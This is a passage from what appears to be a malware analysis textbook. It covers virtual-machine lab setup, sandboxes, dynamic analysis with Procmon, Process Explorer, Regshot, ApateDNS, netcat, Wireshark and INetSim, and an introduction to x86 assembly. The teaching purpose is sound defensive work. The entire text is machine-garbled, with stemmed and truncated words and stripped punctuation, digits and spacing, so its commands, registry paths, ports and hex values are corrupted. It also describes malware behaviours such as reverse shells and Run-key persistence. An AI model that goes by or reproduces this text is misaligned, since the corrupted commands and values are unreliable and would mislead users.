httpwwwvirustotalcom match existingantiviru definit q indic file pack obfusc indic file pack unpack possibl q program compil q import hint program function import tell q hostor networkbas indic could use identifi malwar infect machin q file one resourc resourc section use resourc hacker examin resourc use extract resourc learn resourcechapt malwar analysi virtual machin run malwar perform dynam analysi must set safe environ fresh malwar full surpris run product machin quickli spread machin network difficult remov safe environ allow investig malwar without expos machin machin network unexpect unnecessari risk use dedic physic virtual machin studi malwar safe malwar analyz use individu physic machin airgap network isol network machin disconnect internet network prevent malwar spread airgap network allow run malwar real environ without put comput risk one disadvantag test scenario howev lack internet connect mani piec malwar depend live internet connect updat command control featur anoth disadvantag analyz malwar physic rather virtual machin malwar difficult remov avoid problem peopl test malwar physic machin use tool norton ghost manag backup imag oper system oss restor machin theyv complet analysi main advantag use physic machin malwar analysi malwar sometim execut differ virtual machin your analyz malwar virtual machin malwar detect run virtual machin behav differ thwart analysi risk disadvantag come use physic machin analyz malwar virtual machin commonli use dynam analysi chapter well focu use virtual machin malwar analysisth structur virtual machin virtual machin like comput insid comput illustr figur guest os instal within host os virtual machin os run virtual machin kept isol host os malwar run virtual machin harm host os malwar damag virtual machin simpli reinstal os virtual machin return virtual machin clean state figur tradit applic run shown left column guest os contain entir within virtual machin virtual applic contain within guest os vmware offer popular seri desktop virtual product use analyz malwar virtual machin vmware player free use creat run virtual machin lack featur necessari effect malwar analysi vmware workstat cost littl gener better choic malwar analysi includ featur snapshot allow save current state virtual machin abil clone copi exist virtual machin mani altern vmware parallel microsoft virtual pc microsoft hyperv xen vari host guest os support andfeatur book focu use vmware virtual prefer anoth virtual tool still find discuss relevantcr malwar analysi machin cours use virtual machin malwar analysi need creat one book specif virtual wont walk detail present option best bet unless know differ requir choos default hardwar configur choos hard drive size base need vmware use disk space intellig resiz virtual disk dynam base need storag exampl creat gb hard drive store gb data vmware shrink size virtual hard drive accordingli virtual drive size gb typic good begin amount enough store guest os tool might need malwar analysi vmware make lot choic case choic job next youll instal os applic malwar malwar analysi tool run window like instal window virtual os write window xp still popular os surprisingli target malwar well focu explor window xp youv instal os instal requir applic alway instal applic later usual easier set everyth appendix b list use applic malwar analysi next youll instal vmware tool vmware menu select vm instal vmware tool begin instal vmware tool improv user experi make mous keyboard respons also allow access share folder draganddrop file transfer variou use featur well discuss chapter youv instal vmware time configur configur vmware malwar includ network function exampl worm perform network attack machin effort spread would want allow worm access network could spreadto comput analyz malwar probabl want observ malwar network activ help understand author intent creat signatur exercis program fulli vmware offer sever network option virtual network shown figur discuss follow section figur virtual network configur option network adapt disconnect network although configur virtual machin network connect usual good idea disconnect network use certain case without network connect wont abl analyz malici network activ still reason disconnect network vmware either remov network adapt virtual machin bydisconnect network adapt network choos vm remov devic also control whether network adapt connect automat machin turn check connect power checkbox see figur set hostonli network hostonli network featur creat separ privat lan host os guest os commonli use malwar analysi hostonli lan connect internet mean malwar contain within virtual machin allow network connect note configur host comput ensur fulli patch protect case malwar your test tri spread good idea configur restrict firewal host virtual machin help prevent malwar spread host microsoft firewal come window xp servic pack later well document provid suffici protect even patch date howev malwar could spread use zeroday exploit host os figur illustr network configur hostonli network hostonli network enabl vmware creat virtual network adapt host virtual machin connect two without touch host physic network adapt host physic network adapt still connect internet extern network figur hostonli network vmware use multipl virtual machin one last configur combin best option requir multipl virtual machin link lan disconnect internet host machineso malwar connect network network isnt connect anyth import figur show custom configur two virtual machin connect configur one virtual machin set analyz malwar second machin provid servic two virtual machin connect vmnet virtual switch case host machin still connect extern network machin run malwar figur custom network vmware use one virtual machin analysi youll find use combin machin virtual machin team machin join part virtual machin team abl manag power network set togeth creat new virtual machin team choos file new team use malwar analysi machin exercis function subject malwar much possibl must simul network servic malwar reli exampl malwar commonli connect http server download addit malwar observ activ youll need give malwar access domain name system dn server resolv server ip address well http server respond request custom network configur describ machin provid servic run servic requir malwar commun well discuss varieti tool use simul network servic next chapter connect malwar internet sometim youll want connect malwarerun machin internet provid realist analysi environ despit obviou risk biggest risk cours comput perform malici activ spread malwar addit host becom node distribut denial ofservic attack simpli spam anoth risk malwar writer could notic connect malwar server tri analyz malwar never connect malwar internet without first perform analysi determin malwar might connect connect comfort risk common way connect virtual machin internet use vmware bridg network adapt allow virtual machin connect network interfac physic machin anoth way connect malwar run virtual machin internet use vmware network address translat nat mode nat mode share host ip connect internet host act like router translat request virtual machin come host ip address mode use host connect network network configur make difficult imposs connect virtual machin adapt networkfor exampl host use wireless adapt nat mode easili use connect virtual machin network even wireless network wi fi protect access wpa wire equival privaci wep enabl host adapt connect network allow certain network adapt connect nat mode allow virtual machin connect host therebi avoid network access control set connect disconnect peripher devic peripher devic cdrom extern usb storag drive pose particular problem virtual machin devic connect either physic machin virtual machin vmware interfac allow connect disconnect extern devic virtual machin connect usb devic machin virtual machin window activ vmware connect usb devic guest host may undesir consid grow popular worm spread via usb storag devic modifi set choos vm set usb control uncheck automat connect new usb devic checkbox prevent usb devic connect virtual machin take snapshot take snapshot concept uniqu virtual machin vmware virtual machin snapshot allow save comput current state return point later similar window restor point timelin figur illustr take snapshot work take snapshot comput shortli run malwar sampl revert snapshot os softwar compon machin return state everyth occur eras though never happen see take snapshot extrem power tool like builtin undo featur save hassl need reinstal osfigur snapshot timelin youv instal os malwar analysi tool configur network take snapshot use snapshot base cleanslat snapshot next run malwar complet analysi save data revert base snapshot your middl analyz malwar want someth differ virtual machin without eras progress vmware snapshot manag allow return snapshot time matter addit snapshot taken sinc happen machin addit branch snapshot follow differ path take look follow exampl workflow analyz malwar sampl get frustrat want tri anoth sampl take snapshot malwar analysi sampl return base imag begin analyz malwar sampl take snapshot take break return virtual machin access either snapshot time shown figur two machin state complet independ save mani snapshot disk spacefigur vmware snapshot manag transfer file virtual machin one drawback use snapshot work undertaken virtual machin lost revert earlier snapshot howev save work load earlier snapshot transfer file want keep host os use vmware draganddrop featur long vmware tool instal guest os system run window abl drag drop file directli guest os host os simplest easiest way transfer file anoth way transfer data vmware share folder share folder access host guest os similar share window folderth risk use vmware malwar analysi malwar detect run within virtual machin mani techniqu publish detect situat vmware consid vulner take explicit step avoid detect malwar execut differ run virtual machin make life difficult malwar analyst chapter discuss antivmwar techniqu detail like softwar vmware occasion vulner exploit caus host os crash even use run code host os although public tool welldocu way exist exploit vmware vulner found share folder featur tool releas exploit draganddrop function make sure keep vmware version fulli patch cours even take possibl precaut risk alway present your analyz malwar whatev even run analysi virtual machin avoid perform malwar analysi critic sensit machinerecordreplay run comput revers one vmware interest featur recordreplay featur vmware workstat record everyth happen replay record later time record offer percent fidel everi instruct execut origin record execut replay even record includ oneinamillion race condit cant replic includ replay vmware also moviecaptur featur record video output recordreplay actual execut cpu instruct os program unlik movi interrupt execut point interact comput make chang virtual machin exampl make mistak program lack undo featur restor virtual machin point prior mistak someth differ introduc tool throughout book well examin mani power way use recordreplay well return featur chapter conclus run analyz malwar use vmware virtual machin involv follow step start clean snapshot malwar run transfer malwar virtual machin conduct analysi virtual machin take note screenshot data virtual machin transfer physic machin revert virtual machin clean snapshot new malwar analysi tool releas exist tool updat need updat clean base imag simpli instal tool updat take new clean snapshot analyz malwar usual need run malwar observ behavior run malwar must care infect comput network vmware allow run malwar safe control environ provid tool need clean malwar finish analyz throughout book discuss run malwar assum run malwar within virtual machinechapt basic dynam analysi dynam analysi examin perform execut malwar dynam analysi techniqu second step malwar analysi process dynam analysi typic perform basic static analysi reach dead end whether due obfusc pack analyst exhaust avail static analysi techniqu involv monitor malwar run examin system malwar execut unlik static analysi dynam analysi let observ malwar true function exampl exist action string binari mean action actual execut dynam analysi also effici way identifi malwar function exampl malwar keylogg dynam analysi allow locat keylogg log file system discov kind record keep deciph send inform kind insight would difficult gain use basic static techniqu although dynam analysi techniqu extrem power perform basic static analysi complet dynam analysi put network system risk dynam techniqu limit code path may execut piec malwar run exampl case commandlin malwar requir argument argument could execut differ program function without know option wouldnt abl dynam examin program function best bet use advanc dynam static techniqu figur forc malwar execut function chapter describ basic dynam analysi techniqu sandbox quickanddirti approach sever allinon softwar product use perform basic dynam analysi popular one use sandbox technolog sandbox asecur mechan run untrust program safe environ without fear harm real system sandbox compris virtual environ often simul network servic fashion ensur softwar malwar test function normal use malwar sandbox mani malwar sandboxessuch norman sandbox gfi sandbox anubi joe sandbox threatexpert bitblaz comodo instant malwar analysiswil analyz malwar free current norman sandbox gfi sandbox formerli cwsandbox popular among computersecur profession sandbox provid easytounderstand output great initi triag long will submit malwar sandbox websit even though sandbox autom might choos submit malwar contain compani inform public websit note purchas sandbox tool inhous use extrem expens instead discov everyth sandbox find use basic techniqu discuss chapter cours lot malwar analyz might worth purchas sandbox softwar packag configur process malwar quickli sandbox work similarli well focu one exampl gfi sandbox figur show tabl content pdf report gener run file gfi sandbox autom analysi malwar report includ varieti detail malwar network activ perform file creat result scan virustot onfigur gfi sandbox sampl result winxyzex report gener gfi sandbox vari number section contain base analysi find gfi sandbox report six section figur follow analysi summari section list static analysi inform highlevel overview dynam analysi result file activ section list file open creat delet process impact malwar creat mutex section list mutex creat malwar registri activ section list chang registri network activ section includ network activ spawn malwar includ set listen port perform dn request virustot result section list result virustot scan malwar sandbox drawback malwar sandbox major drawback exampl sandbox simpli run execut without commandlin option malwareexecut requir commandlin option execut code run option provid addit subject malwar wait commandandcontrol packet return launch backdoor backdoor launch sandbox sandbox also may record event neither sandbox may wait long enough exampl malwar set sleep day perform malici activ may miss event sandbox hook sleep function set sleep briefli one way sleep sandbox account potenti drawback includ follow malwar often detect run virtual machin virtual machin detect malwar might stop run behav differ sandbox take issu account malwar requir presenc certain registri key file system might found sandbox might requir contain legitim data command encrypt key malwar dll certain export function invok properli dll run easili execut sandbox environ os may correct malwar exampl malwar might crash window xp run correctli window sandbox tell malwar may report basic function tell malwar custom secur account manag sam hash dump util encrypt keylog backdoor exampl conclus must draw ownrun malwar basic dynam analysi techniqu render useless cant get malwar run focu run major malwar encount exe dll although youll usual find simpl enough run execut malwar doubleclick execut run file command line tricki launch malici dll window doesnt know run automat well discuss dll intern depth chapter let take look launch dll success perform dynam analysi program rundllex includ modern version window provid contain run dll use syntax c rundllex dllname export argument export valu must function name ordin select export function tabl dll learn chapter use tool peview pe explor view export tabl exampl file ripdll follow export instal uninstal instal appear like way launch ripdll let launch malwar follow c rundllex ripdll instal malwar also function export ordinalthat export function ordin number discuss depth chapter case still call function rundllex use follow command ordin number want call prepend charact c rundllex xyzzydl malici dll frequent run code dllmain call dll entri point dllmain execut whenev dll load often get inform dynam forc dll loadus rundllex altern even turn dll execut modifi pe header chang extens forc window load dll would execut modifi pe header wipe imagefiledl x flag characterist field imagefilehead chang wont run import function run dllmain method may caus malwar crash termin unexpectedli howev long chang caus malwar execut malici payload collect inform analysi rest doesnt matter dll malwar may also need instal servic sometim conveni export installservic list iprxdll c rundll iprxdllinstallservic servicenam c net start servicenam servicenam argument must provid malwar instal run net start command use start servic window system note see servicemain function without conveni export function instal installservic may need instal servic manual use window sc command modifi registri unus servic use net start servic servic entri locat registri hklmsystemcurrentcontrolsetservic monitor process monitor process monitor procmon advanc monitor tool window provid way monitor certain registri file system network process thread activ combin enhanc function two legaci tool filemon regmon although procmon captur lot data doesnt captur everyth exampl miss devic driver activ usermod compon talk rootkit via devic io control well certain gui call setwindowshookex although procmon use tool usual use log network activ work consist across microsoft window version warn throughout chapter use tool test malwar dynam test malwar sure protect comput network use virtual machin discuss previou chapter procmon monitor system call gather soon run mani system call exist window machin sometim event minut usual imposs look result procmon use ram log event told stop captur crash virtual machin use avail memori avoid run procmon limit period time stop procmon captur event choos file captur event use procmon analysi first clear current captur event remov irrelev data choos edit clear display next run subject malwar captur turn minut discontinu event captur procmon display procmon display configur column contain inform individu event includ event sequenc number timestamp name process caus event event oper path use event result event detail inform long fit screen otherwis difficult read find either case view fulldetail particular event doubleclick row figur show collect procmon event occur machin run piec malwar name mmex read oper column quickli tell oper mmex perform system includ registri file system access one entri note creation file cdocument settingsal usersappl datamwmmgrtxt sequenc number use createfil word success result column tell oper success figur procmon mmex exampl filter procmon alway easi find inform procmon look thousand event one one that procmon filter capabl key set procmon filter one execut run system featur particularli use malwar analysi set filter piec malwar run also filter individu system call regsetvalu createfil writefil suspici destruct call procmon filter turn filter record event record event still avail even though filter show limit display set filter way prevent procmon consum much memori set filter choos filter filter open filter menu shown top imag figur set filter first select column filter use dropdown box upper left reset button import filter malwar analysi process name oper detail next select compar choos option contain less finallychoos whether filter includ exclud display default display show system call import reduc amount display figur set procmon filter note procmon use basic filter default exampl contain filter exclud procmonex one exclud pagefil log access often provid use inform see first two row figur filter process name oper weve ad filter process name equal mmex that activ oper set regsetvalu youv chosen filter click add click appli result appli filter display window shown lower imag display event make easier us see mmex perform regsetvalu registri key hklmsoftwaremicrosoftwindow currentversionrunsysvcontrol sequenc number use regsetvalu doubleclick regsetvalu event reveal data written locat current path malwar malwar extract anoth execut ran dont worri inform still rememb filter control display system call occur ran malwar captur includ system call malwar extract origin execut see malwar extract chang filter display extract name click appli event relat extract malwar display procmon provid help automat filter toolbar four filter circl figur filter follow categori registri examin registri oper tell piec malwar instal registri file system explor file system interact show file malwar creat configur file use process activ investig process activ tell whether malwar spawn addit process network identifi network connect show port malwar listen four filter select default turn filter simpli click icon toolbar correspond categori figur filter button procmonnot malwar run boot time use procmon boot log option instal procmon startup driver captur startup event analysi procmon record event take practic patienc sinc mani event simpli part standard way execut start use procmon easier find quickli review event listingview process process explor process explor free microsoft extrem power task manag run perform dynam analysi provid valuabl insight process current run system use process explor list activ process dll load process variou process properti overal system inform also use kill process log user launch valid process process explor display process explor monitor process run system show tree structur display child parent relationship exampl figur see servicesex child process winlogonex indic left curli bracket figur process explor examin svchostex malwar process explor show five column process process name pid process identifi cpu cpu usag descript compani name viewupd everi second default servic highlight pink process blue new process green termin process red green red highlight temporari remov process start termin analyz malwar watch process explor window chang new process sure investig thoroughli process explor display quit bit inform process exampl dll inform display window activ click process see dll load memori chang dll display window handl window show handl held process includ file handl mutex event properti window shown figur open doubleclick process name window provid particularli use inform subject malwar thread tab show activ thread tcpip tab display activ connect port process listen imag tab open figur show path disk executablefigur properti window imag tab use verifi option one particularli use process explor featur verifi button imag tab click button verifi imag disk fact microsoft sign binari microsoft use digit signatur core execut process explor verifi signatur valid sure file actual execut microsoft featur particularli use verifi window file disk corrupt malwar often replac authent window file attempt hide verifi button verifi imag disk rather memori useless attack use process replac involv run process system overwrit memori space malici executableprocess replac provid malwar privileg process replac malwar appear execut legitim process leav fingerprint imag memori differ imag disk exampl figur svchostex process verifi yet actual malwar well discuss process replac detail chapter compar string one way recogn process replac use string tab process properti window compar string contain disk execut imag string memori execut run memori toggl string view use button bottomleft corner shown figur two string list drastic differ process replac may occur string discrep display figur exampl string favoritesdat appear multipl time right half figur svchostex memori found left half figur svchostex disk figur process explor string tab show string disk left versu string memori right activ svchostex use depend walker process explor allow launch dependsex depend walker arun process rightclick process name select launch depend also let search handl dll choos find find handl dll find dll option particularli use find malici dll disk want know run process use dll verifi button verifi exe file disk everi dll load runtim determin whether dll load process load time compar dll list process explor import shown depend walker analyz malici document also use process explor analyz malici document pdf word document quick way determin whether document malici open process explor open suspect malici document document launch process see process explor abl locat malwar disk via imag tab properti window note open malici document use monitor tool quick way determin whether document malici howev success run vulner version document viewer practic best use intent unpatch version view applic ensur exploit success easiest way multipl snapshot analysi virtual machin old version document viewer adob reader microsoft wordcompar registri snapshot regshot regshot shown figur open sourc registri comparison tool allow take compar two registri snapshot use regshot malwar analysi simpli take first shot click st shot button run malwar wait finish make system chang next take second shot click nd shot button final click compar button compar two snapshot figur regshot window exampl display subset result gener regshot malwar analysi registri snapshot taken run spywar ckrex exampl regshot comparison result regshot comment datetim date comput malwareanalysi usernam usernam key ad valu ad hklmsoftwaremicrosoftwindowscurrentversionrunckrcwindowssystem ckrex valu modifi hklmsoftwaremicrosoftcryptographyrngse c c de c c c e dc c c e b ba c fb eb c c e f ce e e ac c e e f f c c eb f c e bd db f total chang see ckrex creat valu hklm softwar microsoftwindow currentversionrun persist mechan certain amount nois typic result randomnumb gener seed constantli updat registri procmon analysi result requir patient scan find nugget interestfak network malwar often beacon eventu commun commandand control server well discuss depth chapter creat fake network quickli obtain network indic without actual connect internet indic includ dn name ip address packet signatur fake network success must prevent malwar realiz execut virtual environ see chapter discuss set virtual network vmware combin tool discuss solid virtual machin network setup greatli increas chanc success use apatedn apatedn free tool mandiant wwwmandiantcomproductsresearchmandiantapatednsdownload quickest way see dn request made malwar apatedn spoof dn respons userspecifi ip address listen udp port local machin respond dn request dn respons set ip address specifi apatedn display hexadecim ascii result request receiv use apatedn set ip address want sent dn respons select interfac next press start server button automat start dn server chang dn set localhost next run malwar watch dn request appear apatedn window exampl figur redirect dn request made malwar known rshell see dn inform request evilmalwarcom request made figur apatedn respond request evilmalwarcom exampl shown figur redirect dn request localhost may want chang address point someth extern fake web server run linux virtual machin ip address differ window malwar analysi virtual machin sure enter appropri ip address start server default apatedn use current gateway current dn set insert dn respons catch addit domain use malwar sampl use nonexist domain nxdomain option malwar often loop differ domain store first second domain found use nxdomain option trick malwar give addit domain configur monitor netcat netcat tcpip swiss armi knife use inbound outbound connect port scan tunnel proxi port forward much listen mode netcat act server connect mode act client netcat take data standard input transmiss network data receiv output screen via standard output let look use netcat analyz malwar rshell figur use apatedn redirect dn request evilmalwarcom local host assum malwar go port commonchoic use netcat listen connect execut malwar malwar frequent use port http http traffic respect port typic block monitor outbound connect exampl show exampl exampl netcat exampl listen port c nc l p post cq framehtm http host wwwgooglecom userag mozilla window window nt twfsdfyzuhbnrlcg rv accept texthtml applic acceptlanguag enu enq acceptencod gzip deflat keepal contenttyp applicationxformurlencod contentlength microsoft window xp version c copyright microsoft corp zmalwar netcat nc command show option requir listen port l flag mean listen p port number specifi port listen malwar connect netcat listen use apatedn redirect see rshell revers shell immedi provid shell network connect first appear http post request wwwgooglecom fake post data rshell probabl insert obfusc revers shell network analyst frequent look start sessionpacket snif wireshark wireshark open sourc sniffer packet captur tool intercept log network traffic wireshark provid visual packetstream analysi depth analysi individu packet like mani tool discuss book wireshark use good evil use analyz intern network network usag debug applic issu studi protocol action also use sniff password reverseengin network protocol steal sensit inform listen onlin chatter local coffe shop wireshark display four part shown figur filter box use filter packet display packet list show packet satisfi display filter packet detail window display content current select packet case packet hex window display hex content current packet hex window link packet detail window highlight field selectfigur wireshark dn http exampl use wireshark view content tcp session rightclick tcp packet select follow tcp stream see figur end convers display session order differ color show side connectionfigur wireshark follow tcp stream window captur packet choos captur interfac select interfac want use collect packet option includ use promiscu mode set captur filter warn wireshark known mani secur vulner sure run safe environ wireshark help understand malwar perform network commun snif packet malwar commun use wireshark purpos connect internet simul internet connect start wireshark packet captur run malwar use netcat simul internet connect chapter discuss protocol analysi addit use wireshark detailus inetsim inetsim free linuxbas softwar suit simul common internet servic easiest way run inetsim base oper system microsoft window instal linux virtual machin set virtual network malwar analysi virtual machin inetsim best free tool provid fake servic allow analyz network behavior unknown malwar sampl emul servic http http ftp irc dn smtp other exampl display servic inetsim emul default includ default port use shown program start exampl inetsim default emul servic dn udptcp start pid http tcp start pid http tcp start pid smtp tcp start pid irc tcp start pid smtp tcp start pid ntp udp start pid pop tcp start pid finger tcp start pid syslog udp start pid tftp udp start pid pop tcp start pid time tcp start pid ftp tcp start pid ident tcp start pid time udp start pid ftp tcp start pid daytim tcp start pid daytim udp start pid echo tcp start pid echo udp start pid discard udp start pid discard tcp start pid quotd tcp start pid quotd udp start pid chargen tcp start pid dummi udp start pid chargen udp start pid dummi tcp start pid inetsim best look like real server mani easili configur featur ensur success exampl default return banner microsoft ii web server scannedsom inetsim best featur built http http server simul exampl inetsim serv almost file request exampl piec malwar request jpeg websit continu oper inetsim respond properli format jpeg although imag might file malwar look server return anoth error respons even incorrect keep malwar run inetsim also record inbound request connect youll find particularli use determin whether malwar connect standard servic see request make inetsim extrem configur exampl set page item return request realiz subject malwar look particular web page continu execut provid page also modifi port variou servic listen use malwar use nonstandard port inetsim built malwar analysi mind offer mani uniqu featur dummi servic featur log data receiv client regardless port dummi servic use captur traffic sent client port bound servic modul use record port malwar connect correspond data sent least tcp handshak complet addit data gatheredbas dynam tool practic tool discuss chapter use concert maxim amount inform glean dynam analysi section well look tool discuss chapter present sampl setup malwar analysi setup might includ follow run procmon set filter malwar execut name clear event run start process explor gather first snapshot registri use regshot set virtual network like use inetsim apatedn set network traffic log use wireshark figur show diagram virtual network set malwar analysi virtual network contain two host malwar analysi window virtual machin linux virtual machin run inetsim linux virtual machin listen mani port includ http ftp http use inetsim window virtual machin listen port dn request use apatedn dn server window virtual machin configur localhost apatedn configur redirect linux virtual machin attempt brows websit use window virtual machin dn request resolv apatedn redirect linux virtual machin browser perform get request port inetsim server listen port linux virtual machinefigur exampl virtual network let see setup would work practic examin malwar mstsex complet initi setup run mstsex malwar analysi virtual machin time stop event captur procmon run second snapshot regshot point begin analysi follow examin apatedn see dn request perform shown figur notic malwar perform dn request wwwmalwareanalysisbookcom figur apatedn request wwwmalwareanalysisbookcom review procmon result file system modif procmon result shown figur see createfil writefil sequenc number oper cwindowssystemwinhlpex upon investig compar winhlpex mstsex see ident conclud malwar copi locationfigur procmon output mstsex filter set compar two snapshot taken regshot identifi chang review regshot result shown next see malwar instal autorun registri valu winhlp hklmsoftwaremicrosoftwindowscurrentversionrun locat data written valu malwar copi cwindowssystemwinhlpex newli copi binari execut upon system reboot valu ad hklmsoftwaremicrosoftwindowscurrentversionrunwinhlp cwindowssystemwinhlpex use process explor examin process determin whether creat mutex listen incom connect process explor output figur show mstsex creat mutex also known mutant name evil discuss mutex depth chapter know mstsex like creat mutex ensur one version malwar run time mutex provid excel fingerprint malwar uniqu enough review inetsim log request attempt connect standard servic first line inetsim log shown next tell us malwar commun port though standard secur socket layer ssl shown next report error x http tcp connect x http tcp error set ssl ssl accept attempt fail unknown error errorfcssl routinessslgetclienthellounknown protocol x http tcp disconnectfigur process explor examin activ mstsex process review wireshark captur network traffic gener malwar use inetsim captur wireshark captur tcp handshak initi data packet sent malwar content tcp stream sent port shown figur show random acsii data often indic custom protocol happen best bet run malwar sever time look consist initi packet connect result inform could use draft networkbas signatur skill explor chapter figur wireshark show custom network protocolconclus basic dynam analysi malwar assist confirm basic static analysi find tool describ chapter free easi use provid consider detail howev basic dynam analysi techniqu defici wont stop exampl understand network compon mstsex fulli would need reverseengin protocol determin best continu analysi next step perform advanc static analysi techniqu disassembl dissect binari level discuss next chapterlab lab analyz malwar found file labex use basic dynam analysi tool question q malwar import string q malwar hostbas indic q use networkbas signatur malwar lab analyz malwar found file labdll use basic dynam analysi tool question q get malwar instal q would get malwar run instal q find process malwar run q filter could set order use procmon glean inform q malwar hostbas indic q use networkbas signatur malwar lab execut malwar found file labex monitor use basic dynam analysi tool safe environ question q notic monitor malwar process explor q identifi live memori modificationsq malwar hostbas indic q purpos program lab analyz malwar found file labex use basic dynam analysi tool program analyz chapter lab question q happen run file q caus roadblock dynam analysi q way run programpart ii advanc static analysischapt crash cours x disassembl discuss previou chapter basic static dynam malwar analysi method good initi triag provid enough inform analyz malwar complet basic static techniqu like look outsid bodi autopsi use static analysi draw preliminari conclus depth analysi requir get whole stori exampl might find particular function import wont know use whether use basic dynam techniqu also shortcom exampl basic dynam analysi tell subject malwar respond receiv special design packet learn format packet dig deeper that disassembl come youll learn chapter disassembl special skill daunt new program dont discourag chapter give basic understand disassembl get right foot level abstract tradit comput architectur comput system repres sever level abstract creat way hide implement detail exampl run window os mani differ type hardwar underli hardwar abstract os figur show three code level involv malwar analysi malwar author creat program highlevel languag level use compil gener machin code run cpu convers malwar analyst revers engin oper lowlevel languag level use disassembl gener assembl code read analyz figur program operatesfigur code level exampl figur show simplifi model comput system gener describ follow six differ level abstract list level start bottom higher level abstract place near top specif concept underneath lower get less portabl level across comput system hardwar hardwar level physic level consist electr circuit implement complex combin logic oper xor gate known digit logic physic natur hardwar easili manipul softwar microcod microcod level also known firmwar microcod oper exact circuitri design contain microinstruct translat higher machinecod level provid way interfac hardwar perform malwar analysi usual dont worri microcod often specif comput hardwar written machin code machin code level consist opcod hexadecim digit tell processor want machin code typic implement sever microcod instruct underli hardwar execut code machin code creat computerprogram written highlevel languag compil lowlevel languag lowlevel languag humanread version comput architectur instruct set common lowlevel languag assembl languag malwar analyst oper lowlevel languag level machin code difficult human comprehend use disassembl gener lowlevel languag text consist simpl mnemon mov jmp mani differ dialect assembl languag exist well explor turn note assembl highest level languag reliabl consist recov machin code highlevel languag sourc code avail highlevel languag comput programm oper level highlevel languag highlevel languag provid strong abstract machin level make easi use program logic flowcontrol mechan highlevel languag includ c c other languag typic turn machin code compil process known compil interpret languag interpret languag top level mani programm use interpret languag c perl net java code level compil machin code instead translat bytecod bytecod intermedi represent specif program languag bytecod execut within interpret program translat bytecod execut machin code fli runtim interpret provid automat level abstract compar tradit compil code handl error memori manag independ osreverseengin malwar store disk typic binari form machin code level discuss machin code form code comput run quickli effici disassembl malwar shown figur take malwar binari input gener assembl languag code output usual disassembl chapter discuss popular disassembl ida pro assembl languag actual class languag assembl dialect typic use program singl famili microprocessor x x sparc powerpc mip arm x far popular architectur pc bit person comput x also known intel ia modern bit version microsoft window design run x architectur addit amd intel architectur run window support x bit binari reason malwar compil x focu throughout book chapter cover malwar compil intel architectur well focu x architectur aspect come often malwar analysi note addit inform assembl randal hyde art assembl languag nd edit starch press excel resourc hyde book offer patient introduct x assembl nonassembl programmersth x architectur intern modern comput architectur includ x follow von neumann architectur illustr figur three hardwar compon central process unit cpu execut code main memori system ram store data code inputoutput system io interfac devic hard drive keyboard monitor figur von neumann architectur see figur cpu contain sever compon control unit get instruct execut ram use regist instruct pointer store address instruct execut regist cpu basic data storag unit often use save time cpu doesnt need access ram arithmet logic unit alu execut instruct fetch ram place result regist memori process fetch execut instruct instruct repeat program run main memoryth main memori ram singl program divid follow four major section shown figur figur basic memori layout program data term use refer specif section memori call data section contain valu put place program initi load valu sometim call static valu may chang program run may call global valu avail part program code code includ instruct fetch cpu execut program task code control program program task orchestr heap heap use dynam memori program execut creat alloc new valu elimin free valu program longer need heap refer dynam memori content chang frequent program run stack stack use local variabl paramet function help control program flow cover stack depth later chapter although diagram figur show four major section memori aparticular order piec may locat throughout memori exampl guarante stack lower code vice versa instruct instruct build block assembl program x assembl instruct made mnemon zero operand shown tabl mnemon word identifi instruct execut mov move data operand typic use identifi inform use instruct regist data tabl instruct format mnemon destin operand sourc operand mov ecx x opcod endian instruct correspond opcod oper code tell cpu oper program want perform book sourc use term opcod entir machin instruct although intel technic defin much narrowli disassembl translat opcod humanread instruct exampl tabl see opcod b instruct mov ecx x valu xb correspond mov ecx x correspond valu x tabl instruct opcod instruct mov ecx x opcod b x treat valu x x architectur use littleendian format endian data describ whether signific bigendian least signific littleendian byte order first smallest address within larger data item chang endian somethingmalwar must network commun network data use big endian x program use littleendian therefor ip address repres xf bigendian format network xf littleendian format local memori malwar analyst must cogniz endian ensur dont accident revers order import indic like ip address operand operand use identifi data use instruct three type operand use immedi operand fix valu x shown tabl regist operand refer regist ecx tabl memori address operand refer memori address contain valu interest typic denot valu regist equat bracket eax regist regist small amount data storag avail cpu whose content access quickli storag avail elsewher x processor collect regist avail use temporari storag workspac tabl show common x regist fall follow four categori gener regist use cpu execut segment regist use track section memori statu flag use make decis instruct pointer use keep track next instruct execut use tabl refer throughout chapter see regist categor broken section follow discuss regist categori depth tabl x registersgener regist segment regist statu regist instruct pointer eax ax ah al cs eflag eip ebx bx bh bl ss ecx cx ch cl ds edx dx dh dl es ebp bp fs esp sp gs esi si gener regist bit size referenc either bit assembl code exampl edx use refer full bit regist dx use refer lower bit edx regist four regist eax ebx ecx edx also referenc bit valu use lowest bit second set bit exampl al use refer lowest bit eax regist ah use refer second set bit tabl list possibl refer gener regist eax regist breakdown illustr figur exampl bit byte regist eax contain valu xadcf code refer data insid eax three addit way ax byte xf al byte xf ah byte x gener regist gener regist typic store data memori address often use interchang get thing accomplish within program howev despit call gener regist arent alway use wayfigur x eax regist breakdown x instruct use specif regist definit exampl multipl divis instruct alway use eax edx addit instruct definit gener regist use consist fashion throughout program use regist consist fashion across compil code known convent knowledg convent use compil allow malwar analyst examin code quickli time isnt wast figur context regist use exampl eax gener contain return valu function call therefor see eax regist use immedi function call probabl see code manipul return valu flag eflag regist statu regist x architectur bit size bit flag execut flag either set clear control cpu oper indic result cpu oper follow flag import malwar analysi zf zero flag set result oper equal zero otherwis clearedcf carri flag set result oper larg small destin operand otherwis clear sf sign flag set result oper neg clear result posit flag also set signific bit set arithmet oper tf trap flag use debug x processor execut one instruct time flag set note detail avail flag see volum intel ia architectur softwar develop manual discuss end chapter eip instruct pointer x architectur eip also known instruct pointer program counter regist contain memori address next instruct execut program eip purpos tell processor next note eip corrupt point memori address contain legitim program code cpu abl fetch legitim code execut program run time like crash control eip control execut cpu attack attempt gain control eip exploit gener attack must attack code memori chang eip point code exploit system simpl instruct simplest common instruct mov use move data one locat anoth word instruct read write memori mov instruct move data regist ram format mov destin sourc use intel syntax throughout book list destin operand first tabl contain exampl mov instruct operand surround bracket treat memori refer data exampl ebx refer data memori address ebx final exampl tabl use anequ calcul memori address save space requir separ instruct perform calcul contain within bracket perform calcul within instruct possibl unless calcul memori address exampl mov e ax ebxesi without bracket invalid instruct tabl mov instruct exampl instruct descript mov eax ebx copi content ebx eax regist mov eax x copi valu x eax regist mov eax xc copi byte memori locat xc eax regist mov eax ebx copi byte memori locat specifi ebx regist eax regist mov eax ebxesi copi byte memori locat specifi result equat ebxesi eax regist anoth instruct similar mov lea mean load effect address format instruct lea destin sourc lea instruct use put memori address destin exampl lea eax ebx put ebx eax contrast mov eax ebx load data memori address specifi ebx therefor lea eax ebx would mov eax 